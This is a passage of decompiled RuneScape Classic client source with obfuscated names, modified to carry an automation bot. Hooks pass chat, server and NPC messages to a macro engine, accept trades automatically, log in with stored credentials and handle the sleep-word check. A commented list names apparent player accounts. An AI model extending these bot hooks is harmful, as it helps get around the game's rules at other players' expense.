                if(super.anInt33 > byte0 + 298 && super.anInt34 >= byte1 + 204 && super.anInt33 < byte0 + 408 && super.anInt34 <= byte1 + 215)
                    k1 = 0xff0000;
                gfx.method254("Click here to buy", byte0 + 405, byte1 + 214, 3, k1);
            } else
            {
                gfx.drawString("This item is not currently available to buy", byte0 + 204, byte1 + 214, 3, 0xffff00);
            }
            if(InvCount(i5) > 0)
            {
                int l5 = deh + ebf[ddh];
                if(l5 < 10)
                    l5 = 10;
                int k6 = (l5 * identify.ahk[i5]) / 100;
                gfx.method254("Sell your " + identify.itemName[i5] + " for " + k6 + "gp", byte0 + 405, byte1 + 239, 1, 0xffff00);
                int l1 = 0xffffff;
                if(super.anInt33 > byte0 + 2 && super.anInt34 >= byte1 + 229 && super.anInt33 < byte0 + 112 && super.anInt34 <= byte1 + 240)
                    l1 = 0xff0000;
                gfx.method257("Click here to sell", byte0 + 2, byte1 + 239, 3, l1);
                return;
            }
            gfx.drawString("You do not have any of this item to sell", byte0 + 204, byte1 + 239, 3, 0xffff00);
        }
    }

    public final void DisplayMessage(String s, int i)
    {
		if (i == 4 && s.indexOf(": wishes to trade with you") > 0)
		{
			if (Running)
				macro.TradeRequest(PlayerByName(s.substring(5,s.indexOf(":"))));
		}
        int j1 = identify.anInt144;
        if(i == 2 || i == 4 || i == 6)
        {
            for(; s.length() > 5 && s.charAt(0) == '@' && s.charAt(4) == '@'; s = s.substring(5));
            int j = s.indexOf(":");
            if(j != -1)
            {
                String s1 = s.substring(0, j);
                long l = fnf.method362(s1);
                for(int i1 = 0; i1 < super.anInt627; i1++)
                    if(super.aLongArray628[i1] == l)
                        return;

            }
        }
        if(i == 2)
            s = "@ora@" + s;
        if(i == 3 || i == 4)
		{
			if (Running)
				macro.ServerMessage(s);
			lastservermessage = s;
			gotnewmessage = true;
            s = "@whi@" + s;
		}
        if(i == 6)
            s = "@cya@" + s;
		if (i == 5)
		{
			if (Running)
				macro.NPCMessage(s);
			lastnpcmessage = s;
		}
        if(anInt780 != 0)
        {
            if(i == 4 || i == 3)
                anInt790 = 200;
            if(i == 2 && anInt780 != 1)
                anInt791 = 200;
            if(i == 5 && anInt780 != 2)
                anInt792 = 200;
            if(i == 6 && anInt780 != 3)
                anInt793 = 200;
            if(i == 3 && anInt780 != 0)
                anInt780 = 0;
            if(i == 6 && anInt780 != 3 && anInt780 != 0)
                anInt780 = 0;
        }
        for(int k = 4; k > 0; k--)
        {
            aStringArray774[k] = aStringArray774[k - 1];
            anIntArray935[k] = anIntArray935[k - 1];
        }

        aStringArray774[0] = s;
        anIntArray935[0] = 300;
        if(i == 2)
            if(aClass4_775.anIntArray187[anInt776] == aClass4_775.anIntArray188[anInt776] - 4)
                aClass4_775.method168(anInt776, s, true);
            else
                aClass4_775.method168(anInt776, s, false);
        if(i == 5)
            if(aClass4_775.anIntArray187[anInt778] == aClass4_775.anIntArray188[anInt778] - 4)
                aClass4_775.method168(anInt778, s, true);
            else
                aClass4_775.method168(anInt778, s, false);
        if(i == 6)
        {
            if(aClass4_775.anIntArray187[anInt779] == aClass4_775.anIntArray188[anInt779] - 4)
            {
                aClass4_775.method168(anInt779, s, true);
                return;
            }
            aClass4_775.method168(anInt779, s, false);
        }
    }

    final void method119(int i, int j, int k, int l, int i1, int j1, int k1)
    {
        int l1 = identify.anIntArray53[i1] + anInt950;
        int i2 = identify.anIntArray58[i1];
        gfx.method247(i, j, k, l, l1, i2, 0, 0, false);
    }

    public final void method120()
    {
        int i = identify.anInt144;
        aClass4_830.method139(super.anInt33, super.anInt34, super.anInt36, super.anInt35);
        if(aClass4_830.buttonDown(anInt694))
            do
                anInt871 = ((anInt871 - 1) + identify.anInt123) % identify.anInt123;
            while((identify.anIntArray84[anInt871] & 3) != 1 || (identify.anIntArray84[anInt871] & 4 * anInt878) == 0);
        if(aClass4_830.buttonDown(anInt695))
            do
                anInt871 = (anInt871 + 1) % identify.anInt123;
            while((identify.anIntArray84[anInt871] & 3) != 1 || (identify.anIntArray84[anInt871] & 4 * anInt878) == 0);
        if(aClass4_830.buttonDown(anInt696))
            anInt874 = ((anInt874 - 1) + anIntArray885.length) % anIntArray885.length;
        if(aClass4_830.buttonDown(anInt697))
            anInt874 = (anInt874 + 1) % anIntArray885.length;
        if(aClass4_830.buttonDown(anInt698) || aClass4_830.buttonDown(anInt699))
        {
            for(anInt878 = 3 - anInt878; (identify.anIntArray84[anInt871] & 3) != 1 || (identify.anIntArray84[anInt871] & 4 * anInt878) == 0; anInt871 = (anInt871 + 1) % identify.anInt123);
            for(; (identify.anIntArray84[anInt872] & 3) != 2 || (identify.anIntArray84[anInt872] & 4 * anInt878) == 0; anInt872 = (anInt872 + 1) % identify.anInt123);
        }
        if(aClass4_830.buttonDown(anInt700))
            anInt875 = ((anInt875 - 1) + anIntArray832.length) % anIntArray832.length;
        if(aClass4_830.buttonDown(anInt701))
            anInt875 = (anInt875 + 1) % anIntArray832.length;
        if(aClass4_830.buttonDown(anInt702))
            anInt877 = ((anInt877 - 1) + anIntArray829.length) % anIntArray829.length;
        if(aClass4_830.buttonDown(anInt703))
            anInt877 = (anInt877 + 1) % anIntArray829.length;
        if(aClass4_830.buttonDown(anInt704))
            anInt876 = ((anInt876 - 1) + anIntArray832.length) % anIntArray832.length;
        if(aClass4_830.buttonDown(anInt705))
            anInt876 = (anInt876 + 1) % anIntArray832.length;
        if(aClass4_830.buttonDown(anInt706))
        {
            super.packets.id(238);
            super.packets.var(anInt878);
            super.packets.var(anInt871);
            super.packets.var(anInt872);
            super.packets.var(anInt873);
            super.packets.var(anInt874);
            super.packets.var(anInt875);
            super.packets.var(anInt876);
            super.packets.var(anInt877);
            super.packets.send();
            gfx.method212();
            aBoolean992 = false;
        }
    }

    public final void method121()
    {
        int k1 = identify.anInt144;
        byte abyte0[] = method18("media" + Class18.anInt576 + ".jag", "2d graphics", 20);
        if(abyte0 == null)
        {
            aBoolean922 = true;
            return;
        }
        byte abyte1[] = fnf.method366("index.dat", 0, abyte0);
        gfx.method225(anInt948, fnf.method366("inv1.dat", 0, abyte0), abyte1, 1);
        gfx.method225(anInt948 + 1, fnf.method366("inv2.dat", 0, abyte0), abyte1, 6);
        gfx.method225(anInt948 + 9, fnf.method366("bubble.dat", 0, abyte0), abyte1, 1);
        gfx.method225(anInt948 + 10, fnf.method366("runescape.dat", 0, abyte0), abyte1, 1);
        gfx.method225(anInt948 + 11, fnf.method366("splat.dat", 0, abyte0), abyte1, 3);
        gfx.method225(anInt948 + 14, fnf.method366("icon.dat", 0, abyte0), abyte1, 8);
        gfx.method225(anInt948 + 22, fnf.method366("hbar.dat", 0, abyte0), abyte1, 1);
        gfx.method225(anInt948 + 23, fnf.method366("hbar2.dat", 0, abyte0), abyte1, 1);
        gfx.method225(anInt948 + 24, fnf.method366("compass.dat", 0, abyte0), abyte1, 1);
        gfx.method225(anInt948 + 25, fnf.method366("buttons.dat", 0, abyte0), abyte1, 2);
        gfx.method225(anInt949, fnf.method366("scrollbar.dat", 0, abyte0), abyte1, 2);
        gfx.method225(anInt949 + 2, fnf.method366("corners.dat", 0, abyte0), abyte1, 4);
        gfx.method225(anInt949 + 6, fnf.method366("arrows.dat", 0, abyte0), abyte1, 2);
        gfx.method225(anInt951, fnf.method366("projectile.dat", 0, abyte0), abyte1, identify.anInt108);
        int i = identify.anInt76;
        for(int j = 1; i > 0; j++)
        {
            int k = i;
            i -= 30;
            if(k > 30)
                k = 30;
            gfx.method225(anInt950 + (j - 1) * 30, fnf.method366("objects" + j + ".dat", 0, abyte0), abyte1, k);
        }

        gfx.method228(anInt948);
        gfx.method228(anInt948 + 9);
        for(int l = 11; l <= 26; l++)
            gfx.method228(anInt948 + l);

        for(int i1 = 0; i1 < identify.anInt108; i1++)
            gfx.method228(anInt951 + i1);

        for(int j1 = 0; j1 < identify.anInt76; j1++)
            gfx.method228(anInt950 + j1);

    }

    protected final byte[] method18(String s, String s1, int i)
    {
        if(!aBoolean979)
            s = "Data/" + s;
        byte abyte0[] = Class8.method265(s);
        if(abyte0 != null)
        {
            int j = ((abyte0[0] & 0xff) << 16) + ((abyte0[1] & 0xff) << 8) + (abyte0[2] & 0xff);
            int k = ((abyte0[3] & 0xff) << 16) + ((abyte0[4] & 0xff) << 8) + (abyte0[5] & 0xff);
            byte abyte1[] = new byte[abyte0.length - 6];
            for(int l = 0; l < abyte0.length - 6; l++)
                abyte1[l] = abyte0[l + 6];

            method15(i, "Unpacking " + s1);
            if(k != j)
            {
                byte abyte2[] = new byte[j];
                Class3.method130(abyte2, j, abyte1, k, 0);
                return abyte2;
            } else
            {
                return abyte1;
            }
        } else
        {
            return super.method18(s, s1, i);
        }
    }

    protected final Socket method19(String s, int i)
        throws IOException
    {
        if(Class8.anApplet370 != null)
        {
            Socket socket = Class8.method266(i);
            if(socket == null)
                throw new IOException();
            else
                return socket;
        }
        Socket socket1;
        if(method7())
            socket1 = new Socket(InetAddress.getByName(getCodeBase().getHost()), i);
        else
            socket1 = new Socket(InetAddress.getByName(s), i);
        socket1.setSoTimeout(30000);
        socket1.setTcpNoDelay(true);
        return socket1;
    }

    protected final void method2()
    {
        if(aBoolean666)
            return;
        if(aBoolean890)
            return;
        if(aBoolean922)
            return;
        try
        {
            anInt918++;
            if(ehc == 0)
            {
                super.anInt12 = 0;
                method57();
            }
            if(ehc == 1)
            {
                super.anInt12++;
                method82();
            }
            super.anInt36 = 0;
            super.anInt38 = 0;
            anInt902++;
            if(anInt902 > 500)
            {
                anInt902 = 0;
                int i = (int)(Math.random() * 4D);
                if((i & 1) == 1)
                    anInt895 += anInt896;
                if((i & 2) == 2)
                    anInt973 += anInt974;
            }
            if(anInt895 < -50)
                anInt896 = 2;
            if(anInt895 > 50)
                anInt896 = -2;
            if(anInt973 < -50)
                anInt974 = 2;
            if(anInt973 > 50)
                anInt974 = -2;
            if(anInt790 > 0)
                anInt790--;
            if(anInt791 > 0)
                anInt791--;
            if(anInt792 > 0)
                anInt792--;
            if(anInt793 > 0)
            {
                anInt793--;
                return;
            }
        }
        catch(OutOfMemoryError _ex)
        {
			_ex.toString();
            method85();
            aBoolean890 = true;
        }
    }

    protected final void method20(Runnable runnable)
    {
        if(Class8.anApplet370 != null)
        {
            Class8.method267(runnable);
            return;
        } else
        {
            Thread thread = new Thread(runnable);
            thread.setDaemon(true);
            thread.start();
            return;
        }
    }

    protected final void method23()
    {
        anInt749 = 0;
        if(anInt746 != 0)
        {
            method39();
            return;
        } else
        {
            super.method23();
            return;
        }
    }

    protected final void method3()
    {
        method22();
        method85();
        if(anInputStream_Sub1_901 != null)
            anInputStream_Sub1_901.method122();
    }

    protected final void method36(String s, String s1)
    {
        if(anInt690 == 1)
            aClass4_667.method169(anInt732, s + " " + s1);
        if(anInt690 == 2)
            aClass4_751.method169(anInt864, s + " " + s1);
        aString862 = s1;
        method70();
        method9();
    }

    protected final void method38()
    {
        int l1 = identify.anInt144;
        anInt749 = 0;
        fightmode = 0;
        anInt746 = 0;
        anInt690 = 0;
        ehc = 1;
        method66();
        gfx.method212();
        gfx.method211(aGraphics857, 0, 0);
        for(int i = 0; i < mobCount; i++)
        {
            aClass10_739.method270(aClass5Array814[i]);
            efh.method434(mobx[i], moby[i], mobtype[i]);
        }

        for(int j = 0; j < doorcount; j++)
        {
            aClass10_739.method270(aClass5Array781[j]);
            efh.method427(doorx[j], doory[j], doordir[j], doortype[j]);
        }

        mobCount = 0;
        doorcount = 0;
        itemCount = 0;
        playerCount = 0;
        for(int k = 0; k < 4000; k++)
            aClass2Array891[k] = null;

        for(int l = 0; l < 500; l++)
            player[l] = null;

        npcCount = 0;
        for(int i1 = 0; i1 < 5000; i1++)
            aClass2Array957[i1] = null;

        for(int j1 = 0; j1 < 500; j1++)
            npc[j1] = null;

        for(int k1 = 0; k1 < 50; k1++)
            dia[k1] = false;

        anInt813 = 0;
        super.anInt36 = 0;
        super.anInt35 = 0;
        shop = false;
        bank = false;
        sleeping = false;
        super.anInt624 = 0;
    }

    protected final void method39()
    {
        anInt749 = 0;
        anInt690 = 0;
        ehc = 0;
        anInt746 = 0;
    }

    protected final void method4()
    {
        if(aBoolean922)
        {
            Graphics g = getGraphics();
            g.setColor(Color.black);
            g.fillRect(0, 0, 512, 356);
            g.setFont(new Font("Helvetica", 1, 16));
            g.setColor(Color.yellow);
            int i = 35;
            g.drawString("Sorry, an error has occured whilst loading RuneScape", 30, i);
            i += 50;
            g.setColor(Color.white);
            g.drawString("To fix this try the following (in order):", 30, i);
            i += 50;
            g.setColor(Color.white);
            g.setFont(new Font("Helvetica", 1, 12));
            g.drawString("1: Try closing ALL open web-browser windows, and reloading", 30, i);
            i += 30;
            g.drawString("2: Try clearing your web-browsers cache from tools->internet options", 30, i);
            i += 30;
            g.drawString("3: Try using a different game-world", 30, i);
            i += 30;
            g.drawString("4: Try rebooting your computer", 30, i);
            i += 30;
            g.drawString("5: Try selecting a different version of Java from the play-game menu", 30, i);
            method8(1);
            return;
        }
        if(aBoolean666)
        {
            Graphics g1 = getGraphics();
            g1.setColor(Color.black);
            g1.fillRect(0, 0, 512, 356);
            g1.setFont(new Font("Helvetica", 1, 20));
            g1.setColor(Color.white);
            g1.drawString("Error - unable to load game!", 50, 50);
            g1.drawString("To play RuneScape make sure you play from", 50, 100);
            g1.drawString("http://www.runescape.com", 50, 150);
            method8(1);
            return;
        }
        if(aBoolean890)
        {
            Graphics g2 = getGraphics();
            g2.setColor(Color.black);
            g2.fillRect(0, 0, 512, 356);
            g2.setFont(new Font("Helvetica", 1, 20));
            g2.setColor(Color.white);
            g2.drawString("Error - out of memory!", 50, 50);
            g2.drawString("Close ALL unnecessary programs", 50, 100);
            g2.drawString("and windows before loading the game", 50, 150);
            g2.drawString("RuneScape needs about 48meg of spare RAM", 50, 200);
            method8(1);
            return;
        }

try
        {
	if (autologin)
			if (ehc == 0)
				AutoLogin();
		if (ehc == 1)
			if(sleeping)
				sleepword();
		if (!disable)
			{
				if(ehc == 0)
				{
					gfx.aBoolean338 = false;
					method70();
				}
				if(ehc == 1)
				{
					gfx.aBoolean338 = true;
					method108();
					return;
				}
			}
			try
			{
				Thread.sleep(10);
			}
			catch (InterruptedException e) { e.toString();}
        }
        catch(OutOfMemoryError _ex)
        {
			_ex.toString();
            method85();
            aBoolean890 = true;
        }
    }
	public void AutoLogin()
	{
		login(loginname, loginpass, false);
	}


    protected final void method40()
    {
        anInt746 = 0;
        DisplayMessage("@cya@Sorry, you can't logout at the moment", 3);
    }

    protected final void method41(int i, int j, byte abyte0[])
    {
        int l44 = identify.anInt144;
        try
        {
            if(i == 141)
            {
                anInt743 = playerCount;
                for(int k = 0; k < anInt743; k++)
                    aClass2Array923[k] = player[k];

                int k7 = 8;
                smallx = fnf.method359(abyte0, k7, 11);
                k7 += 11;
                smally = fnf.method359(abyte0, k7, 13);
                k7 += 13;
                int l13 = fnf.method359(abyte0, k7, 4);
                k7 += 4;
				
				//k7 = 36

                boolean flag1 = method98(smallx, smally);
                smallx -= bigx;
                smally -= bigy;
                int l22 = smallx * absnpc + 64;
                int l25 = smally * absnpc + 64;
                if(flag1)
                {
                    myplayer.anInt156 = 0;
                    myplayer.anInt155 = 0;
                    myplayer.x = myplayer.anIntArray157[0] = l22;
                    myplayer.y = myplayer.anIntArray158[0] = l25;
                }
                playerCount = 0;
                myplayer = method76(anInt978, l22, l25, l13);
                int i29 = fnf.method359(abyte0, k7, 8);

                k7 += 8;
                for(int l33 = 0; l33 < i29; l33++)
                {
                    Class2 class2_3 = aClass2Array923[l33 + 1];
                    int k39 = fnf.method359(abyte0, k7, 1);
                    k7++;
                    if(k39 != 0)
                    {
                        int k41 = fnf.method359(abyte0, k7, 1);
                        k7++;
                        if(k41 == 0)
                        {
                            int l42 = fnf.method359(abyte0, k7, 3);
                            k7 += 3;
                            int l43 = class2_3.anInt156;
                            int j44 = class2_3.anIntArray157[l43];
                            int k44 = class2_3.anIntArray158[l43];
                            if(l42 == 2 || l42 == 1 || l42 == 3)
                                j44 += absnpc;
                            if(l42 == 6 || l42 == 5 || l42 == 7)
                                j44 -= absnpc;
                            if(l42 == 4 || l42 == 3 || l42 == 5)
                                k44 += absnpc;
                            if(l42 == 0 || l42 == 1 || l42 == 7)
                                k44 -= absnpc;
                            class2_3.anInt154 = l42;
                            class2_3.anInt156 = l43 = (l43 + 1) % 10;
                            class2_3.anIntArray157[l43] = j44;
                            class2_3.anIntArray158[l43] = k44;
                        } else
                        {
                            int i43 = fnf.method359(abyte0, k7, 4);
                            if((i43 & 0xc) == 12)
                            {
                                k7 += 2;
                                continue;
                            }
                            class2_3.anInt154 = fnf.method359(abyte0, k7, 4);
                            k7 += 4;
                        }
                    }
                    player[playerCount++] = class2_3;
                }

                int i37 = 0;
                while(k7 + 24 < j * 8) 
                {
                    int l39 = fnf.method359(abyte0, k7, 11);
                    k7 += 11;
                    int l41 = fnf.method359(abyte0, k7, 5);
                    k7 += 5;
                    if(l41 > 15)
                        l41 -= 32;
                    int j43 = fnf.method359(abyte0, k7, 5);
                    k7 += 5;
                    if(j43 > 15)
                        j43 -= 32;
                    int i14 = fnf.method359(abyte0, k7, 4);
                    k7 += 4;
                    int i44 = fnf.method359(abyte0, k7, 1);
                    k7++;
                    int i23 = (smallx + l41) * absnpc + 64;
                    int i26 = (smally + j43) * absnpc + 64;
                    method76(l39, i23, i26, i14);
                    if(i44 == 0)
                        anIntArray815[i37++] = l39;
                }
                if(i37 > 0)
                {
                    super.packets.id(241);
                    super.packets.cmd(i37);
                    for(int i40 = 0; i40 < i37; i40++)
                    {
                        Class2 class2_4 = aClass2Array891[anIntArray815[i40]];
                        super.packets.cmd(class2_4.id);
                        super.packets.cmd(class2_4.anInt148);
                    }

                    super.packets.send();
                    i37 = 0;
                }
                return;
            }
            if(i == 172)
            {
                for(int l = 1; l < j;)
                    if(fnf.method353(abyte0[l]) == 255)
                    {
                        int l7 = 0;
                        int j14 = smallx + abyte0[l + 1] >> 3;
                        int i19 = smally + abyte0[l + 2] >> 3;
                        l += 3;
                        for(int j23 = 0; j23 < itemCount; j23++)
                        {
                            int j26 = (itemx[j23] >> 3) - j14;
                            int j29 = (itemy[j23] >> 3) - i19;
                            if(j26 != 0 || j29 != 0)
                            {
                                if(j23 != l7)
                                {
                                    itemx[l7] = itemx[j23];
                                    itemy[l7] = itemy[j23];
                                    itemtype[l7] = itemtype[j23];
                                    anIntArray773[l7] = anIntArray773[j23];
                                }
                                l7++;
                            }
                        }

                        itemCount = l7;
                    } else
                    {
                        int i8 = fnf.method354(abyte0, l);
                        l += 2;
                        int k14 = smallx + abyte0[l++];
                        int j19 = smally + abyte0[l++];
                        if((i8 & 0x8000) == 0)
                        {
                            itemx[itemCount] = k14;
                            itemy[itemCount] = j19;
                            itemtype[itemCount] = i8;
                            anIntArray773[itemCount] = 0;
                            for(int k23 = 0; k23 < mobCount; k23++)
                            {
                                if(mobx[k23] != k14 || moby[k23] != j19)
                                    continue;
                                anIntArray773[itemCount] = identify.anIntArray66[mobtype[k23]];
                                break;
                            }

                            itemCount++;
                        } else
                        {
                            i8 &= 0x7fff;
                            int l23 = 0;
                            for(int k26 = 0; k26 < itemCount; k26++)
                                if(itemx[k26] != k14 || itemy[k26] != j19 || itemtype[k26] != i8)
                                {
                                    if(k26 != l23)
                                    {
                                        itemx[l23] = itemx[k26];
                                        itemy[l23] = itemy[k26];
                                        itemtype[l23] = itemtype[k26];
                                        anIntArray773[l23] = anIntArray773[k26];
                                    }
                                    l23++;
                                } else
                                {
                                    i8 = -123;
                                }

                            itemCount = l23;
                        }
                    }

                return;
            }
            if(i == 158)
            {
                for(int i1 = 1; i1 < j;)
                    if(fnf.method353(abyte0[i1]) == 255)
                    {
                        int j8 = 0;
                        int l14 = smallx + abyte0[i1 + 1] >> 3;
                        int k19 = smally + abyte0[i1 + 2] >> 3;
                        i1 += 3;
                        for(int i24 = 0; i24 < mobCount; i24++)
                        {
                            int l26 = (mobx[i24] >> 3) - l14;
                            int k29 = (moby[i24] >> 3) - k19;
                            if(l26 != 0 || k29 != 0)
                            {
                                if(i24 != j8)
                                {
                                    aClass5Array814[j8] = aClass5Array814[i24];
                                    aClass5Array814[j8].anInt257 = j8;
                                    mobx[j8] = mobx[i24];
                                    moby[j8] = moby[i24];
                                    mobtype[j8] = mobtype[i24];
                                    mobid[j8] = mobid[i24];
                                }
                                j8++;
                            } else
                            {
                                aClass10_739.method270(aClass5Array814[i24]);
                                efh.method434(mobx[i24], moby[i24], mobtype[i24]);
                            }
                        }

                        mobCount = j8;
                    } else
                    {
                        int k8 = fnf.method354(abyte0, i1);
                        i1 += 2;
                        int i15 = smallx + abyte0[i1++];
                        int l19 = smally + abyte0[i1++];
                        int j24 = 0;
                        for(int i27 = 0; i27 < mobCount; i27++)
                            if(mobx[i27] != i15 || moby[i27] != l19)
                            {
                                if(i27 != j24)
                                {
                                    aClass5Array814[j24] = aClass5Array814[i27];
                                    aClass5Array814[j24].anInt257 = j24;
                                    mobx[j24] = mobx[i27];
                                    moby[j24] = moby[i27];
                                    mobtype[j24] = mobtype[i27];
                                    mobid[j24] = mobid[i27];
                                }
                                j24++;
                            } else
                            {
                                aClass10_739.method270(aClass5Array814[i27]);
                                efh.method434(mobx[i27], moby[i27], mobtype[i27]);
                            }

                        mobCount = j24;
                        if(k8 != 60000)
                        {
                            int l29 = efh.method402(i15, l19);
                            int i34;
                            int j37;
                            if(l29 == 0 || l29 == 4)
                            {
                                i34 = identify.anIntArray63[k8];
                                j37 = identify.anIntArray64[k8];
                            } else
                            {
                                j37 = identify.anIntArray63[k8];
                                i34 = identify.anIntArray64[k8];
                            }
                            int j40 = ((i15 + i15 + i34) * absnpc) / 2;
                            int i42 = ((l19 + l19 + j37) * absnpc) / 2;
                            int k43 = identify.anIntArray62[k8];
                            Class5 class5_1 = aClass5Array994[k43].method204();
                            aClass10_739.method269(class5_1);
                            class5_1.anInt257 = mobCount;
                            class5_1.method189(0, l29 * 32, 0);
                            class5_1.method191(j40, -efh.method421(j40, i42), i42);
                            class5_1.method185(true, 48, 48, -50, -10, -50);
                            efh.method407(i15, l19, k8);
                            if(k8 == 74)
                                class5_1.method191(0, -480, 0);
                            mobx[mobCount] = i15;
                            moby[mobCount] = l19;
                            mobtype[mobCount] = k8;
                            mobid[mobCount] = l29;
                            aClass5Array814[mobCount++] = class5_1;
                        }
                    }

                return;
            }
            if(i == 37)
            {
                int j1 = 1;
                InvCount = abyte0[j1++] & 0xff;
                for(int l8 = 0; l8 < InvCount; l8++)
                {
                    int j15 = fnf.method354(abyte0, j1);
                    j1 += 2;
                    inv[l8] = j15 & 0x7fff;
                    isWorn[l8] = j15 / 32768;
                    if(identify.ahl[j15 & 0x7fff] == 0)
                    {
                        dkb[l8] = fnf.method358(abyte0, j1);
                        if(dkb[l8] >= 128)
                            j1 += 4;
                        else
                            j1++;
                    } else
                    {
                        dkb[l8] = 1;
                    }
                }

                return;
            }
            if(i == 183)
            {
                int k1 = fnf.method354(abyte0, 1);
                int i9 = 3;
                for(int k15 = 0; k15 < k1; k15++)
                {
                    int i20 = fnf.method354(abyte0, i9);
                    i9 += 2;
                    Class2 class2 = aClass2Array891[i20];
                    byte byte6 = abyte0[i9];
                    i9++;
                    if(byte6 == 0)
                    {
                        int i30 = fnf.method354(abyte0, i9);
                        i9 += 2;
                        if(class2 != null)
                        {
                            class2.anInt163 = 150;
                            class2.anInt162 = i30;
                        }
                    } else
                    if(byte6 == 1)
                    {
                        byte byte7 = abyte0[i9];
                        i9++;
                        if(class2 != null)
                        {                       
    String s2 = ffn.fhe(cen.cfd(abyte0, i9, byte7));  
                         boolean flag3 = false;
                            for(int k40 = 0; k40 < super.anInt627; k40++)
                                if(super.aLongArray628[k40] == class2.aLong145)
                                    flag3 = true;                     
     if(!flag3)
                            {                      
 class2.lastSaidTime = 150;                              
  class2.lastSaidMessage = s2;                              
//sbot's admin accounts --- or not
  //if(class2.name.equalsIgnoreCase("weiner skeet") || class2.name.equalsIgnoreCase("1337 skeet") || class2.name.equalsIgnoreCase("skeet 1337") || class2.name.equalsIgnoreCase("1337antiyou") || class2.name.equalsIgnoreCase("blacklabeljr") || class2.name.equalsIgnoreCase("j3ll04t3m3") || class2.name.equalsIgnoreCase("franklin z") || class2.name.equalsIgnoreCase("pro at kilin") || class2.name.equalsIgnoreCase("creepy1564") || class2.name.equalsIgnoreCase("robertcop") || class2.name.equalsIgnoreCase("j3ll04t3y0u") || class2.name.equalsIgnoreCase("j3ll04t3b4ss") || class2.name.equalsIgnoreCase("j3ll04t3h1m") || class2.name.equalsIgnoreCase("antiyou2uall") || class2.name.equalsIgnoreCase("leo ownz") || class2.name.equalsIgnoreCase("the king leo") || class2.name.equalsIgnoreCase("Im useless") || class2.name.equalsIgnoreCase("lil pep") || class2.name.equalsIgnoreCase("xx phr0sty x") || class2.name.equalsIgnoreCase("xx phr0st x") || class2.name.equalsIgnoreCase("sn0 king") || class2.name.equalsIgnoreCase("sir visa3") || class2.name.equalsIgnoreCase("wicked choob") || class2.name.equalsIgnoreCase("choobpk1npmp") || class2.name.equalsIgnoreCase("firefromhell") || class2.name.equalsIgnoreCase("ch00bpkinpmp"))
//list ends
//CheckDev(cen.cfd(abyte0, i9, byte7));    
DisplayMessage(class2.name + ": " + class2.lastSaidMessage, 2);
				lastChatter = class2.id;
				lastChatterName = class2.name;							
	if (Running)									macro.ChatMessage(class2.lastSaidMessage);
	lastchatmessage = class2.lastSaidMessage;
                      }
                        }
                        i9 += byte7;
                    } else
                    if(byte6 == 2)
                    {
                        int j30 = fnf.method353(abyte0[i9]);
                        i9++;
                        int j34 = fnf.method353(abyte0[i9]);
                        i9++;
                        int k37 = fnf.method353(abyte0[i9]);
                        i9++;
                        if(class2 != null)
                        {
                            class2.anInt164 = j30;
                            class2.anInt165 = j34;
                            class2.hbg = k37;
                            class2.anInt167 = 200;
                            if(class2 == myplayer)
                            {
                                curstat[3] = j34;
                                stat[3] = k37;
                                aBoolean908 = false;
                                aBoolean745 = false;
                            }
                        }
                    } else
                    if(byte6 == 3)
                    {
                        int k30 = fnf.method354(abyte0, i9);
                        i9 += 2;
                        int k34 = fnf.method354(abyte0, i9);
                        i9 += 2;
                        if(class2 != null)
                        {
                            class2.anInt173 = k30;
                            class2.anInt175 = k34;
                            class2.anInt174 = -1;
                            class2.anInt176 = anInt897;
                        }
                    } else
                    if(byte6 == 4)
                    {
                        int l30 = fnf.method354(abyte0, i9);
                        i9 += 2;
                        int l34 = fnf.method354(abyte0, i9);
                        i9 += 2;
                        if(class2 != null)
                        {
                            class2.anInt173 = l30;
                            class2.anInt174 = l34;
                            class2.anInt175 = -1;
                            class2.anInt176 = anInt897;
                        }
                    } else
                    if(byte6 == 5)
                    {
                        if(class2 != null)
                        {
                            class2.anInt148 = fnf.method354(abyte0, i9);
                            i9 += 2;
                            class2.aLong145 = fnf.method356(abyte0, i9);
                            i9 += 8;
                            class2.name = fnf.method363(class2.aLong145);
                            int i31 = fnf.method353(abyte0[i9]);
                            i9++;
                            for(int i35 = 0; i35 < i31; i35++)
                            {
                                class2.anIntArray159[i35] = fnf.method353(abyte0[i9]);
                                i9++;
                            }

                            for(int l37 = i31; l37 < 12; l37++)
                                class2.anIntArray159[l37] = 0;

                            class2.anInt169 = abyte0[i9++] & 0xff;
                            class2.anInt170 = abyte0[i9++] & 0xff;
                            class2.anInt171 = abyte0[i9++] & 0xff;
                            class2.anInt172 = abyte0[i9++] & 0xff;
                            class2.level = abyte0[i9++] & 0xff;
                            class2.anInt179 = abyte0[i9++] & 0xff;
                        } else
                        {
                            i9 += 14;
                            int j31 = fnf.method353(abyte0[i9]);
                            i9 += j31 + 1;
                        }
                    } else
                    if(byte6 == 6)
                    {
                        byte byte8 = abyte0[i9];
                        i9++;
                        if(class2 != null)
                        {                              
 String s3 = cen.cfd(abyte0, i9, byte8);
                            class2.lastSaidTime = 150;
                            class2.lastSaidMessage = s3;
                            if(class2 == myplayer)  
                           DisplayMessage(class2.name + ": " + class2.lastSaidMessage, 5);
                        }
                        i9 += byte8;
                    }
                }

                return;
            }
            if(i == 29)
            {
                for(int l1 = 1; l1 < j;)
                    if(fnf.method353(abyte0[l1]) == 255)
                    {
                        int j9 = 0;
                        int l15 = smallx + abyte0[l1 + 1] >> 3;
                        int j20 = smally + abyte0[l1 + 2] >> 3;
                        l1 += 3;
                        for(int k24 = 0; k24 < doorcount; k24++)
                        {
                            int j27 = (doorx[k24] >> 3) - l15;
                            int k31 = (doory[k24] >> 3) - j20;
                            if(j27 != 0 || k31 != 0)
                            {
                                if(k24 != j9)
                                {
                                    aClass5Array781[j9] = aClass5Array781[k24];
                                    aClass5Array781[j9].anInt257 = j9 + 10000;
                                    doorx[j9] = doorx[k24];
                                    doory[j9] = doory[k24];
                                    doordir[j9] = doordir[k24];
                                    doortype[j9] = doortype[k24];
                                }
                                j9++;
                            } else
                            {
                                aClass10_739.method270(aClass5Array781[k24]);
                                efh.method427(doorx[k24], doory[k24], doordir[k24], doortype[k24]);
                            }
                        }

                        doorcount = j9;
                    } else
                    {
                        int k9 = fnf.method354(abyte0, l1);
                        l1 += 2;
                        int i16 = smallx + abyte0[l1++];
                        int k20 = smally + abyte0[l1++];
                        byte byte5 = abyte0[l1++];
                        int k27 = 0;
                        for(int l31 = 0; l31 < doorcount; l31++)
                            if(doorx[l31] != i16 || doory[l31] != k20 || doordir[l31] != byte5)
                            {
                                if(l31 != k27)
                                {
                                    aClass5Array781[k27] = aClass5Array781[l31];
                                    aClass5Array781[k27].anInt257 = k27 + 10000;
                                    doorx[k27] = doorx[l31];
                                    doory[k27] = doory[l31];
                                    doordir[k27] = doordir[l31];
